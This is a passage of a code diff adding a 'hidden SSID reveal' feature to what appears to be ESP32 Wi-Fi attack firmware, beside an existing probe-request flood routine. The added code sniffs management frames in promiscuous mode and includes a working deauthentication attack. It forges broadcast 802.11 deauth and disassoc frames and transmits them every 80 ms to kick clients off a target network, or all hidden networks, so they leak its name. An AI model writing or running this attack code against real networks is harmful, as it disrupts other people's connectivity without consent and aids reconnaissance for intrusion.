+                lastTouchActionMs = now;
             }
         } else if (!featureHasTouchNavBar() && !scanning && y >= 290 && y <= 320) {
             if (x >= 0 && x <= 57) {
                 drawButton(0, 304, 57, 16, "Rescan", true, false);
-                delay(50);
                 if (scanNetworks()) {
                     drawScanScreen();
                 }
+                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 122 && x <= 179 && currentIndex > 0) {
                 drawButton(117, 304, 57, 16, "Prev", true, false);
                 currentIndex--;
                 drawScanScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 183 && x <= 240 && currentIndex < network_count - 1) {
                 drawButton(178, 304, 57, 16, "Next", true, false);
                 currentIndex++;
                 drawScanScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             }
         }
@@ -5263,7 +5321,7 @@ void handleTouch() {
                     last_packet_time = 0;
                 }
                 drawAttackScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             } else if (x >= 183 && x <= 240) {
                 drawButton(177, 304, 57, 16, "Back", true, false);
@@ -5271,14 +5329,14 @@ void handleTouch() {
                 last_packet_time = 0;
                 selected_ap_index = -1;
                 drawScanScreen();
-                delay(50);
+                lastTouchActionMs = now;
                 redraw = true;
             }
         }
     }
 
     if (redraw) {
-        delay(100);
+        delay(50);
     }
 }
 
@@ -5484,6 +5542,3703 @@ void probeRequestFloodLoop() {
       }
   }
 }
+
+namespace HiddenSsidReveal {
+
+#define SCREEN_WIDTH 240
+#define SCREEN_HEIGHT 320
+#define STATUS_BAR_Y_OFFSET 20
+#define STATUS_BAR_HEIGHT 16
+#define ICON_SIZE 16
+#define ICON_NUM 2
+
+static constexpr int LIST_HEADER_Y = 50;
+static constexpr int LIST_FIRST_ROW_Y = LIST_HEADER_Y + 20;
+static constexpr int LIST_ROW_H = 22;
+static constexpr int MAX_HIDDEN_APS = 40;
+static constexpr unsigned long LISTEN_HOP_MS = 1500;
+static constexpr unsigned long BTN_DEBOUNCE_MS = 200;
+
+struct HiddenAp {
+  uint8_t bssid[6];
+  int8_t rssi;
+  uint8_t channel;
+  wifi_auth_mode_t authmode;
+  char revealed[33];
+  bool has_name;
+};
+
+static HiddenAp s_aps[MAX_HIDDEN_APS];
+static int s_count = 0;
+static int s_currentIndex = 0;
+static int s_currentPage = 0;
+static int s_selectedIndex = -1;
+static bool s_scanning = false;
+static bool s_listening = false;
+static bool s_forcing = false;
+static bool s_uiDrawn = false;
+static unsigned long s_lastBtnMs = 0;
+static uint32_t s_mgmtFrames = 0;
+static uint32_t s_ssidHits = 0;
+static uint32_t s_deauthSent = 0;
+static unsigned long s_listenStartedMs = 0;
+static unsigned long s_lastStatusMs = 0;
+static unsigned long s_lastHopMs = 0;
+static unsigned long s_lastDeauthMs = 0;
+static int s_hopPos = 0;
+static bool s_listenAll = false;
+static int s_lastRenderedIndex = -1;
+static int s_lastRenderedPage = -1;
+static bool s_revealUiDrawn = false;
+static uint32_t s_lastDrawnDeauth = 0xFFFFFFFF;
+static uint32_t s_lastDrawnMgmt = 0xFFFFFFFF;
+static uint32_t s_lastDrawnHits = 0xFFFFFFFF;
+static bool s_lastDrawnForcing = false;
+static bool s_lastDrawnListening = false;
+static bool s_lastDrawnHasName = false;
+
+static constexpr unsigned long DEAUTH_INTERVAL_MS = 80;
+
+static const uint8_t s_deauthTemplate[26] = {
+    0xC0, 0x00,
+    0x00, 0x00,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+    0x00, 0x00,
+    0x07, 0x00
+};
+static uint8_t s_deauthFrame[26];
+
+static volatile bool s_revealPending = false;
+static volatile int s_revealIndex = -1;
+static char s_pendingSsid[33] = {0};
+static portMUX_TYPE s_revealMux = portMUX_INITIALIZER_UNLOCKED;
+
+static void drawRevealScreen();
+static void drawRevealScreen(bool fullRedraw);
+static void updateRevealStats();
+static void updateNavLabels(bool onRevealScreen);
+static void startListening(bool withForce);
+static void stopListening();
+static void drawScanScreen();
+static void drawScanScreen(bool fullRedraw);
+
+static int networksPerPage() {
+  return max(1, (wifiListBottomY() - LIST_FIRST_ROW_Y) / LIST_ROW_H);
+}
+
+static void updateNavLabels(bool onRevealScreen) {
+  if (!featureHasTouchNavBar()) {
+    return;
+  }
+  if (onRevealScreen) {
+    setTouchNavLabels(s_forcing ? "Stop" : "Force", nullptr, "Exit",
+                      s_listening ? nullptr : "Listen", "Back");
+  } else {
+    setTouchNavLabels("Rescan", "Next", "Exit", "Prev", "Reveal");
+  }
+  redrawTouchButtonBar();
+}
+
+static int compareHiddenAp(const void* a, const void* b) {
+  const HiddenAp* ap1 = (const HiddenAp*)a;
+  const HiddenAp* ap2 = (const HiddenAp*)b;
+  return (int)ap2->rssi - (int)ap1->rssi;
+}
+
+static bool parseSsidIe(const uint8_t* ie, int ieLen, char* out, size_t outSz) {
+  if (!ie || ieLen < 2 || !out || outSz < 2) {
+    return false;
+  }
+  int off = 0;
+  while (off + 2 <= ieLen) {
+    const uint8_t id = ie[off];
+    const uint8_t len = ie[off + 1];
+    if (off + 2 + len > ieLen) {
+      break;
+    }
+    if (id == 0) {
+      if (len == 0 || len > 32) {
+        return false;
+      }
+      bool allZero = true;
+      for (uint8_t i = 0; i < len; i++) {
+        if (ie[off + 2 + i] != 0) {
+          allZero = false;
+          break;
+        }
+      }
+      if (allZero) {
+        return false;
+      }
+      const size_t n = min((size_t)len, outSz - 1);
+      memcpy(out, &ie[off + 2], n);
+      out[n] = '\0';
+      return true;
+    }
+    off += 2 + len;
+  }
+  return false;
+}
+
+static int findApByBssid(const uint8_t* bssid) {
+  if (!bssid) {
+    return -1;
+  }
+  for (int i = 0; i < s_count; i++) {
+    if (memcmp(s_aps[i].bssid, bssid, 6) == 0) {
+      return i;
+    }
+  }
+  return -1;
+}
+
+static void queueReveal(int index, const char* ssid) {
+  if (index < 0 || index >= s_count || !ssid || !ssid[0]) {
+    return;
+  }
+  if (s_aps[index].has_name && strcmp(s_aps[index].revealed, ssid) == 0) {
+    return;
+  }
+  portENTER_CRITICAL(&s_revealMux);
+  strncpy(s_pendingSsid, ssid, sizeof(s_pendingSsid) - 1);
+  s_pendingSsid[sizeof(s_pendingSsid) - 1] = '\0';
+  s_revealIndex = index;
+  s_revealPending = true;
+  portEXIT_CRITICAL(&s_revealMux);
+}
+
+static void snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if (!feature_active || !s_listening || type != WIFI_PKT_MGMT) {
+    return;
+  }
+
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  if (!pkt || !pkt->payload) {
+    return;
+  }
+
+  const uint8_t* p = pkt->payload;
+  int len = pkt->rx_ctrl.sig_len;
+  // ESP-IDF may include FCS in sig_len
+  if (len > 4) {
+    len -= 4;
+  }
+  if (len < 24) {
+    return;
+  }
+
+  s_mgmtFrames++;
+
+  const uint8_t frameCtl = p[0];
+  if ((frameCtl & 0x0C) != 0x00) {
+    return;  // not management
+  }
+  const uint8_t subtype = frameCtl & 0xF0;
+
+  const uint8_t* bssid = nullptr;
+  int ieOff = -1;
+
+  switch (subtype) {
+    case 0x50:  // Probe Response
+      bssid = p + 16;
+      ieOff = 24 + 12;
+      break;
+    case 0x00:  // Association Request
+      bssid = p + 4;
+      ieOff = 24 + 4;
+      break;
+    case 0x20:  // Reassociation Request
+      bssid = p + 4;
+      ieOff = 24 + 10;
+      break;
+    case 0x40: {  // Probe Request (directed only)
+      const uint8_t* addr1 = p + 4;
+      static const uint8_t kBcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
+      if (memcmp(addr1, kBcast, 6) != 0) {
+        bssid = addr1;
+      } else {
+        const uint8_t* addr3 = p + 16;
+        if (memcmp(addr3, kBcast, 6) != 0) {
+          bssid = addr3;
+        }
+      }
+      ieOff = 24;
+      break;
+    }
+    default:
+      return;
+  }
+
+  if (!bssid || ieOff < 0 || ieOff >= len) {
+    return;
+  }
+
+  char ssid[33];
+  if (!parseSsidIe(p + ieOff, len - ieOff, ssid, sizeof(ssid))) {
+    return;
+  }
+
+  s_ssidHits++;
+  const int idx = findApByBssid(bssid);
+  if (idx >= 0) {
+    if (!s_listenAll && s_selectedIndex >= 0 && idx != s_selectedIndex) {
+      return;
+    }
+    queueReveal(idx, ssid);
+  }
+}
+
+static void stopListening() {
+  s_forcing = false;
+  s_listening = false;
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+}
+
+static void sendForceDeauth(const uint8_t* bssid, uint8_t channel) {
+  if (!bssid) {
+    return;
+  }
+  if (channel < 1 || channel > 14) {
+    channel = 1;
+  }
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+
+  // AP -> stations (broadcast)
+  memcpy(s_deauthFrame, s_deauthTemplate, sizeof(s_deauthFrame));
+  s_deauthFrame[0] = 0xC0;
+  memset(&s_deauthFrame[4], 0xFF, 6);
+  memcpy(&s_deauthFrame[10], bssid, 6);
+  memcpy(&s_deauthFrame[16], bssid, 6);
+  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  s_deauthSent++;
+
+  // Stations -> AP
+  memcpy(s_deauthFrame, s_deauthTemplate, sizeof(s_deauthFrame));
+  s_deauthFrame[0] = 0xC0;
+  memcpy(&s_deauthFrame[4], bssid, 6);
+  memset(&s_deauthFrame[10], 0xFF, 6);
+  memcpy(&s_deauthFrame[16], bssid, 6);
+  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  s_deauthSent++;
+
+  // Disassoc broadcast as well
+  memcpy(s_deauthFrame, s_deauthTemplate, sizeof(s_deauthFrame));
+  s_deauthFrame[0] = 0xA0;
+  memset(&s_deauthFrame[4], 0xFF, 6);
+  memcpy(&s_deauthFrame[10], bssid, 6);
+  memcpy(&s_deauthFrame[16], bssid, 6);
+  (void)esp_wifi_80211_tx(WIFI_IF_AP, s_deauthFrame, sizeof(s_deauthFrame), false);
+  s_deauthSent++;
+}
+
+static void startListening(bool withForce) {
+  if (s_count <= 0) {
+    return;
+  }
+
+  uint8_t ch = 1;
+  if (s_listenAll) {
+    s_hopPos = 0;
+    ch = s_aps[0].channel;
+  } else if (s_selectedIndex >= 0 && s_selectedIndex < s_count) {
+    ch = s_aps[s_selectedIndex].channel;
+  }
+  if (ch < 1 || ch > 14) {
+    ch = 1;
+  }
+
+  esp_wifi_set_promiscuous(false);
+  esp_wifi_set_promiscuous_rx_cb(nullptr);
+
+  // SoftAP gives us WIFI_IF_AP for raw deauth TX while promiscuous sniffs rejoins.
+  WiFi.mode(WIFI_AP);
+  delay(30);
+  wifi_config_t ap_config = {};
+  strncpy((char*)ap_config.ap.ssid, "ESP32-DIV", sizeof(ap_config.ap.ssid));
+  ap_config.ap.ssid_len = 9;
+  ap_config.ap.password[0] = '\0';
+  ap_config.ap.authmode = WIFI_AUTH_OPEN;
+  ap_config.ap.ssid_hidden = 1;
+  ap_config.ap.max_connection = 4;
+  ap_config.ap.beacon_interval = 100;
+  ap_config.ap.channel = ch;
+  esp_wifi_set_config(WIFI_IF_AP, &ap_config);
+  esp_wifi_start();
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+
+  esp_wifi_set_promiscuous_rx_cb(snifferCallback);
+  esp_wifi_set_promiscuous(true);
+
+  s_listening = true;
+  s_forcing = withForce;
+  s_mgmtFrames = 0;
+  s_ssidHits = 0;
+  if (withForce) {
+    s_deauthSent = 0;
+  }
+  s_listenStartedMs = millis();
+  s_lastHopMs = millis();
+  s_lastDeauthMs = 0;
+  s_lastStatusMs = 0;
+}
+
+static void toggleForce() {
+  if (s_forcing) {
+    s_forcing = false;
+    updateRevealStats();
+    updateNavLabels(true);
+    return;
+  }
+  if (!s_listening) {
+    startListening(true);
+  } else {
+    s_forcing = true;
+    s_deauthSent = 0;
+    s_lastDeauthMs = 0;
+  }
+  updateRevealStats();
+  updateNavLabels(true);
+}
+
+static void drawButton(int x, int y, int w, int h, const char* label, bool highlight, bool disabled) {
+  FeatureUI::ButtonStyle style = highlight ? FeatureUI::ButtonStyle::Primary
+                                           : FeatureUI::ButtonStyle::Secondary;
+  FeatureUI::drawButtonRect(x, y, w, h, label, style, false, disabled);
+}
+
+static void drawTabBar(const char* leftButton, bool leftDisabled, const char* prevButton,
+                       bool prevDisabled, const char* nextButton, bool nextDisabled) {
+  if (featureHasTouchNavBar()) {
+    updateNavLabels(s_selectedIndex >= 0 || s_listenAll);
+    return;
+  }
+
+  tft.fillRect(0, 304, SCREEN_WIDTH, 16, FEATURE_BG);
+  if (leftButton && leftButton[0]) {
+    drawButton(0, 304, 57, 16, leftButton, false, leftDisabled);
+  }
+  if (prevButton && prevButton[0]) {
+    drawButton(117, 304, 57, 16, prevButton, false, prevDisabled);
+  }
+  if (nextButton && nextButton[0]) {
+    drawButton(177, 304, 57, 16, nextButton, false, nextDisabled);
+  }
+}
+
+static void drawApRow(int i, int y, bool isSel) {
+  char buf[64];
+  char name[16];
+  if (s_aps[i].has_name && s_aps[i].revealed[0]) {
+    strncpy(name, s_aps[i].revealed, 11);
+    name[11] = '\0';
+    if (strlen(s_aps[i].revealed) > 11) {
+      strcat(name, "...");
+    }
+  } else {
+    snprintf(name, sizeof(name), "%02X%02X%02X%02X",
+             s_aps[i].bssid[2], s_aps[i].bssid[3],
+             s_aps[i].bssid[4], s_aps[i].bssid[5]);
+  }
+
+  const char* tag = s_aps[i].has_name ? "OK" : "??";
+  snprintf(buf, sizeof(buf), "%02d: %-14s %3d Ch%2d %s",
+           i + 1, name, s_aps[i].rssi, s_aps[i].channel, tag);
+
+  tft.fillRect(0, y, SCREEN_WIDTH, LIST_ROW_H, TFT_BLACK);
+  tft.setCursor(2, y);
+  tft.setTextColor(isSel ? ORANGE : FEATURE_BG);
+  tft.print(isSel ? ">" : " ");
+  tft.setCursor(10, y);
+  tft.setTextColor(isSel ? ORANGE : (s_aps[i].has_name ? GREEN : WHITE));
+  tft.println(buf);
+}
+
+static void drawScanScreen(bool fullRedraw) {
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  tft.setTextSize(1);
+
+  if (s_scanning) {
+    wifiClearBody(TFT_BLACK);
+    s_lastRenderedIndex = -1;
+    s_lastRenderedPage = -1;
+    tft.setCursor(10, 50);
+    tft.setTextColor(GREEN);
+    tft.println("Scanning.");
+    loading(100, ORANGE, 0, 0, 3, true);
+    tft.setCursor(10, 65);
+    tft.println("Finding hidden SSIDs.");
+    return;
+  }
+
+  if (s_count == 0) {
+    wifiClearBody(TFT_BLACK);
+    s_lastRenderedIndex = -1;
+    s_lastRenderedPage = -1;
+    tft.setTextColor(GREEN);
+    tft.setCursor(10, 50);
+    tft.println("No hidden SSIDs found.");
+    tft.setCursor(10, 65);
+    tft.println("Press Rescan.");
+    drawTabBar("Rescan", false, "Prev", true, "Next", true);
+    return;
+  }
+
+  const int perPage = networksPerPage();
+  if (s_currentIndex < 0) {
+    s_currentIndex = 0;
+  }
+  if (s_currentIndex >= s_count) {
+    s_currentIndex = max(0, s_count - 1);
+  }
+  s_currentPage = s_currentIndex / max(1, perPage);
+
+  const bool pageChanged = (s_currentPage != s_lastRenderedPage);
+  const bool needFull = fullRedraw || pageChanged || (s_lastRenderedIndex < 0);
+
+  if (!needFull && s_lastRenderedIndex != s_currentIndex) {
+    const int prev = s_lastRenderedIndex;
+    const int now = s_currentIndex;
+    if (prev >= s_currentPage * perPage && prev < s_currentPage * perPage + perPage) {
+      const int row = prev - s_currentPage * perPage;
+      drawApRow(prev, LIST_FIRST_ROW_Y + row * LIST_ROW_H, false);
+    }
+    if (now >= s_currentPage * perPage && now < s_currentPage * perPage + perPage) {
+      const int row = now - s_currentPage * perPage;
+      drawApRow(now, LIST_FIRST_ROW_Y + row * LIST_ROW_H, true);
+    }
+    s_lastRenderedIndex = s_currentIndex;
+    return;
+  }
+
+  if (!needFull) {
+    return;
+  }
+
+  wifiClearBody(TFT_BLACK);
+  s_revealUiDrawn = false;
+
+  tft.setTextColor(GREEN);
+  tft.setCursor(10, LIST_HEADER_Y);
+  tft.println("Hidden SSIDs:");
+
+  char page_buf[20];
+  snprintf(page_buf, sizeof(page_buf), "Page %d/%d",
+           s_currentPage + 1, max(1, (s_count + perPage - 1) / perPage));
+  tft.setCursor(180, LIST_HEADER_Y);
+  tft.setTextColor(GREEN);
+  tft.println(page_buf);
+
+  int y = LIST_FIRST_ROW_Y;
+  const int start_index = s_currentPage * perPage;
+  const int end_index = min(start_index + perPage, s_count);
+  for (int i = start_index; i < end_index && y < wifiListBottomY(); i++) {
+    drawApRow(i, y, i == s_currentIndex);
+    y += LIST_ROW_H;
+  }
+
+  drawTabBar("Rescan", false, "Prev", s_currentIndex <= 0, "Next",
+             s_currentIndex >= s_count - 1);
+  s_lastRenderedIndex = s_currentIndex;
+  s_lastRenderedPage = s_currentPage;
+}
+
+static void drawScanScreen() {
+  drawScanScreen(true);
+}
+
+static void fillRevealLine(int y, const char* text, uint16_t color) {
+  tft.fillRect(0, y, SCREEN_WIDTH, 12, TFT_BLACK);
+  tft.setTextColor(color, TFT_BLACK);
+  tft.setCursor(10, y);
+  tft.print(text);
+}
+
+static void updateRevealStats() {
+  if (!s_revealUiDrawn) {
+    drawRevealScreen(true);
+    return;
+  }
+
+  const HiddenAp* ap = nullptr;
+  if (!s_listenAll && s_selectedIndex >= 0 && s_selectedIndex < s_count) {
+    ap = &s_aps[s_selectedIndex];
+  }
+
+  char buf[64];
+  const bool statusChanged =
+      (s_lastDrawnForcing != s_forcing) || (s_lastDrawnListening != s_listening);
+  if (statusChanged) {
+    if (s_forcing) {
+      fillRevealLine(90, "Status: Forcing reveal", ORANGE);
+    } else if (s_listening) {
+      fillRevealLine(90, "Status: Listening", ORANGE);
+    } else {
+      fillRevealLine(90, "Status: Stopped", UI_DIM_TEXT);
+    }
+    s_lastDrawnForcing = s_forcing;
+    s_lastDrawnListening = s_listening;
+
+    if (s_forcing) {
+      fillRevealLine(200, "Force: deauth clients so they", UI_DIM_TEXT);
+      fillRevealLine(214, "reassociate and leak SSID.", UI_DIM_TEXT);
+    } else {
+      fillRevealLine(200, "Force kicks clients to elicit", UI_DIM_TEXT);
+      fillRevealLine(214, "assoc/probe frames with SSID.", UI_DIM_TEXT);
+    }
+  }
+
+  if (s_lastDrawnDeauth != s_deauthSent) {
+    snprintf(buf, sizeof(buf), "Deauth TX: %u", s_deauthSent);
+    fillRevealLine(110, buf, WHITE);
+    s_lastDrawnDeauth = s_deauthSent;
+  }
+
+  if (s_lastDrawnMgmt != s_mgmtFrames || s_lastDrawnHits != s_ssidHits) {
+    snprintf(buf, sizeof(buf), "Mgmt RX: %u  SSID IE: %u", s_mgmtFrames, s_ssidHits);
+    fillRevealLine(125, buf, WHITE);
+    s_lastDrawnMgmt = s_mgmtFrames;
+    s_lastDrawnHits = s_ssidHits;
+  }
+
+  const bool hasName = ap && ap->has_name;
+  if (hasName != s_lastDrawnHasName) {
+    tft.fillRect(0, 168, SCREEN_WIDTH, 14, TFT_BLACK);
+    tft.setCursor(10, 168);
+    if (ap && ap->has_name) {
+      tft.setTextColor(ORANGE, TFT_BLACK);
+      tft.print(ap->revealed);
+    } else if (s_listenAll) {
+      int revealed = 0;
+      for (int i = 0; i < s_count; i++) {
+        if (s_aps[i].has_name) {
+          revealed++;
+        }
+      }
+      tft.setTextColor(ORANGE, TFT_BLACK);
+      snprintf(buf, sizeof(buf), "%d / %d recovered", revealed, s_count);
+      tft.print(buf);
+    } else {
+      tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+      tft.print("(waiting for rejoin...)");
+    }
+    s_lastDrawnHasName = hasName;
+  }
+}
+
+static void drawRevealScreen(bool fullRedraw) {
+  if (!fullRedraw && s_revealUiDrawn) {
+    updateRevealStats();
+    return;
+  }
+
+  tft.drawFastHLine(0, 19, 240, UI_LINE);
+  wifiClearBody(TFT_BLACK);
+  tft.setTextSize(1);
+  s_lastRenderedIndex = -1;
+  s_lastRenderedPage = -1;
+
+  char buf[64];
+  const HiddenAp* ap = nullptr;
+  if (!s_listenAll && s_selectedIndex >= 0 && s_selectedIndex < s_count) {
+    ap = &s_aps[s_selectedIndex];
+  }
+
+  tft.setTextColor(WHITE);
+  tft.setCursor(10, 50);
+  if (s_listenAll) {
+    tft.println("Target: All hidden APs");
+  } else if (ap) {
+    snprintf(buf, sizeof(buf), "Target: %02X:%02X:%02X:%02X:%02X:%02X",
+             ap->bssid[0], ap->bssid[1], ap->bssid[2],
+             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+    tft.println(buf);
+  }
+
+  tft.setCursor(10, 70);
+  if (ap) {
+    snprintf(buf, sizeof(buf), "Channel: %u   RSSI: %d", ap->channel, ap->rssi);
+  } else {
+    snprintf(buf, sizeof(buf), "Hidden APs: %d", s_count);
+  }
+  tft.println(buf);
+
+  if (s_forcing) {
+    fillRevealLine(90, "Status: Forcing reveal", ORANGE);
+  } else if (s_listening) {
+    fillRevealLine(90, "Status: Listening", ORANGE);
+  } else {
+    fillRevealLine(90, "Status: Stopped", UI_DIM_TEXT);
+  }
+
+  snprintf(buf, sizeof(buf), "Deauth TX: %u", s_deauthSent);
+  fillRevealLine(110, buf, WHITE);
+  snprintf(buf, sizeof(buf), "Mgmt RX: %u  SSID IE: %u", s_mgmtFrames, s_ssidHits);
+  fillRevealLine(125, buf, WHITE);
+
+  tft.setTextColor(GREEN, TFT_BLACK);
+  tft.setCursor(10, 150);
+  tft.print("Revealed SSID:");
+
+  tft.fillRect(0, 168, SCREEN_WIDTH, 14, TFT_BLACK);
+  tft.setCursor(10, 168);
+  if (ap && ap->has_name) {
+    tft.setTextColor(ORANGE, TFT_BLACK);
+    tft.println(ap->revealed);
+  } else if (s_listenAll) {
+    int revealed = 0;
+    for (int i = 0; i < s_count; i++) {
+      if (s_aps[i].has_name) {
+        revealed++;
+      }
+    }
+    tft.setTextColor(ORANGE, TFT_BLACK);
+    snprintf(buf, sizeof(buf), "%d / %d recovered", revealed, s_count);
+    tft.println(buf);
+  } else {
+    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
+    tft.println("(waiting for rejoin...)");
+  }
+
+  if (s_forcing) {
+    fillRevealLine(200, "Force: deauth clients so they", UI_DIM_TEXT);
+    fillRevealLine(214, "reassociate and leak SSID.", UI_DIM_TEXT);
+  } else {
+    fillRevealLine(200, "Force kicks clients to elicit", UI_DIM_TEXT);
+    fillRevealLine(214, "assoc/probe frames with SSID.", UI_DIM_TEXT);
+  }
+
+  s_revealUiDrawn = true;
+  s_lastDrawnDeauth = s_deauthSent;
+  s_lastDrawnMgmt = s_mgmtFrames;
+  s_lastDrawnHits = s_ssidHits;
+  s_lastDrawnForcing = s_forcing;
+  s_lastDrawnListening = s_listening;
+  s_lastDrawnHasName = ap && ap->has_name;
+
+  const char* buttons[] = {s_forcing ? "Stop" : "Force", "Back"};
+  drawTabBar(buttons[0], false, "", true, buttons[1], false);
+}
+
+static void drawRevealScreen() {
+  drawRevealScreen(true);
+}
+
+static bool scanHiddenNetworks() {
+  stopListening();
+  s_scanning = true;
+  s_selectedIndex = -1;
+  s_listenAll = false;
+  s_currentPage = 0;
+  s_currentIndex = 0;
+  s_lastRenderedIndex = -1;
+  s_lastRenderedPage = -1;
+  s_revealUiDrawn = false;
+  drawScanScreen(true);
+
+  // Preserve previously revealed names across rescans.
+  HiddenAp prev[MAX_HIDDEN_APS];
+  const int prevCount = min(s_count, MAX_HIDDEN_APS);
+  if (prevCount > 0) {
+    memcpy(prev, s_aps, prevCount * sizeof(HiddenAp));
+  }
+
+  const int n = WifiScan::staWifiScanSync();
+  s_count = 0;
+  if (n <= 0) {
+    s_scanning = false;
+    return false;
+  }
+
+  for (int i = 0; i < n && s_count < MAX_HIDDEN_APS; i++) {
+    String ssid = WiFi.SSID(i);
+    if (ssid.length() > 0) {
+      continue;
+    }
+    const uint8_t* bssid = WiFi.BSSID(i);
+    if (!bssid) {
+      continue;
+    }
+
+    HiddenAp& ap = s_aps[s_count];
+    memset(&ap, 0, sizeof(ap));
+    memcpy(ap.bssid, bssid, 6);
+    ap.rssi = WiFi.RSSI(i);
+    ap.channel = WiFi.channel(i);
+    ap.authmode = WiFi.encryptionType(i);
+    ap.has_name = false;
+    ap.revealed[0] = '\0';
+
+    for (int j = 0; j < prevCount; j++) {
+      if (memcmp(prev[j].bssid, ap.bssid, 6) == 0 && prev[j].has_name) {
+        strncpy(ap.revealed, prev[j].revealed, sizeof(ap.revealed) - 1);
+        ap.has_name = true;
+        break;
+      }
+    }
+    s_count++;
+  }
+
+  if (s_count > 1) {
+    qsort(s_aps, s_count, sizeof(HiddenAp), compareHiddenAp);
+  }
+
+  s_scanning = false;
+  return s_count > 0;
+}
+
+static void openRevealTarget(int index, bool all) {
+  if (!all && (index < 0 || index >= s_count)) {
+    return;
+  }
+  s_listenAll = all;
+  s_selectedIndex = all ? -1 : index;
+  if (!all) {
+    s_currentIndex = index;
+  }
+
+  // Paint first so selection feels instant, then bring radio up.
+  s_listening = false;
+  s_forcing = true;
+  s_mgmtFrames = 0;
+  s_ssidHits = 0;
+  s_deauthSent = 0;
+  drawRevealScreen(true);
+  updateNavLabels(true);
+  startListening(true);
+  updateRevealStats();
+}
+
+static void flushPendingReveal() {
+  if (!s_revealPending) {
+    return;
+  }
+
+  char ssid[33];
+  int index = -1;
+  portENTER_CRITICAL(&s_revealMux);
+  s_revealPending = false;
+  index = s_revealIndex;
+  strncpy(ssid, s_pendingSsid, sizeof(ssid) - 1);
+  ssid[sizeof(ssid) - 1] = '\0';
+  portEXIT_CRITICAL(&s_revealMux);
+
+  if (index < 0 || index >= s_count || !ssid[0]) {
+    return;
+  }
+
+  strncpy(s_aps[index].revealed, ssid, sizeof(s_aps[index].revealed) - 1);
+  s_aps[index].revealed[sizeof(s_aps[index].revealed) - 1] = '\0';
+  s_aps[index].has_name = true;
+  s_forcing = false;
+  updateRevealStats();
+  updateNavLabels(true);
+}
+
+static void handleNavButtons() {
+  const unsigned long now = millis();
+  if (now - s_lastBtnMs < BTN_DEBOUNCE_MS) {
+    (void)isButtonPressedEdge(BTN_LEFT);
+    (void)isButtonPressedEdge(BTN_RIGHT);
+    (void)isButtonPressedEdge(BTN_UP);
+    (void)isButtonPressedEdge(BTN_DOWN);
+    return;
+  }
+
+  const bool onReveal = (s_selectedIndex >= 0 || s_listenAll);
+
+  if (onReveal) {
+    if (isButtonPressedEdge(BTN_LEFT)) {
+      toggleForce();
+      s_lastBtnMs = now;
+      return;
+    }
+    if (isButtonPressedEdge(BTN_UP) && !s_listening) {
+      startListening(false);
+      updateRevealStats();
+      updateNavLabels(true);
+      s_lastBtnMs = now;
+      return;
+    }
+    if (isButtonPressedEdge(BTN_RIGHT)) {
+      stopListening();
+      s_selectedIndex = -1;
+      s_listenAll = false;
+      s_revealUiDrawn = false;
+      drawScanScreen(true);
+      updateNavLabels(false);
+      s_lastBtnMs = now;
+      return;
+    }
+    return;
+  }
+
+  if (s_scanning) {
+    return;
+  }
+
+  if (isButtonPressedEdge(BTN_LEFT)) {
+    scanHiddenNetworks();
+    drawScanScreen(true);
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_UP) && s_currentIndex > 0) {
+    s_currentIndex--;
+    drawScanScreen(false);
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_DOWN) && s_currentIndex < s_count - 1) {
+    s_currentIndex++;
+    drawScanScreen(false);
+    s_lastBtnMs = now;
+    return;
+  }
+  if (isButtonPressedEdge(BTN_RIGHT) && s_count > 0) {
+    openRevealTarget(s_currentIndex, false);
+    s_lastBtnMs = now;
+  }
+}
+
+static void handleTouch() {
+  int x, y;
+  if (!readTouchXY(x, y)) {
+    return;
+  }
+
+  static unsigned long lastTouchActionMs = 0;
+  const unsigned long now = millis();
+  if (now - lastTouchActionMs < 300) {
+    return;
+  }
+
+  const bool onReveal = (s_selectedIndex >= 0 || s_listenAll);
+  bool redraw = false;
+
+  if (!onReveal) {
+    const int listMaxY = LIST_FIRST_ROW_Y + (networksPerPage() * LIST_ROW_H);
+    if (!s_scanning && y >= LIST_FIRST_ROW_Y && y < listMaxY && s_count > 0) {
+      int index = (y - LIST_FIRST_ROW_Y) / LIST_ROW_H + (s_currentPage * networksPerPage());
+      if (index >= 0 && index < s_count) {
+        openRevealTarget(index, false);
+        lastTouchActionMs = now;
+      }
+    } else if (!featureHasTouchNavBar() && !s_scanning && y >= 290 && y <= 320) {
+      if (x >= 0 && x <= 57) {
+        drawButton(0, 304, 57, 16, "Rescan", true, false);
+        scanHiddenNetworks();
+        drawScanScreen();
+        lastTouchActionMs = now;
+        redraw = true;
+      } else if (x >= 122 && x <= 179 && s_currentIndex > 0) {
+        drawButton(117, 304, 57, 16, "Prev", true, false);
+        s_currentIndex--;
+        drawScanScreen(false);
+        lastTouchActionMs = now;
+        redraw = true;
+      } else if (x >= 183 && x <= 240 && s_currentIndex < s_count - 1) {
+        drawButton(178, 304, 57, 16, "Next", true, false);
+        s_currentIndex++;
+        drawScanScreen(false);
+        lastTouchActionMs = now;
+        redraw = true;
+      }
+    }
+  } else {
+    if (!featureHasTouchNavBar() && y >= 290 && y <= 320) {
+      if (x >= 0 && x <= 57) {
+        drawButton(0, 304, 57, 16, s_forcing ? "Stop" : "Force", true, false);
+        toggleForce();
+        lastTouchActionMs = now;
+        redraw = true;
